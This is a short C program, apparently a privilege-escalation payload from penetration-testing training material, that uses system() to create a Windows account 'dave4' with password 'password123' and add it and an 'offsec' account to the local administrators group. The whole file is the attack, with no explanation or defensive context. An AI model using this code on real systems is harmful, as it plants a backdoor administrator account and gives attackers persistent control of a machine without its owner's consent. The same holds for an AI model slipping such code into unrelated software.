#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user dave4 password123 /add");
  i = system ("net localgroup administrators dave4 /add");
  i = system ("net localgroup administrators offsec /add");
  return 0;
}
